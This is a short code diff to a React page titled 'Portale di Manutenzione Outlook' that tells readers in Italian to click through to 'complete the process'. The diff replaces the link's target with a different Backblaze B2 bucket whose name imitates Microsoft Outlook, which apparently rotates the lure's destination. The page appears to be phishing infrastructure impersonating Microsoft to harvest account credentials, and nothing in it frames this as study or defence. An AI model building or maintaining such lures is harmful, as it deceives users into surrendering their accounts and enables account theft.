@@ -9,7 +9,7 @@ const SecondPage = () => (
     <Seo title="Outlook" />
     <h1>Portale di Manutenzione Outlook</h1>
     <p>Clicca qui sotto per completare il processo</p>
-    <Link to="https://msnportaledimanutenzioneonlinedimicrosoftoutlook.s3.us-west-002.backblazeb2.com/index.html">Portale Outlook</Link>
+    <Link to="https://onlinemsnportaledimanutenzionedimicrosoftoutlook.s3.us-west-002.backblazeb2.com/index.html">Portale Outlook</Link>
   </Layout>
 )
 
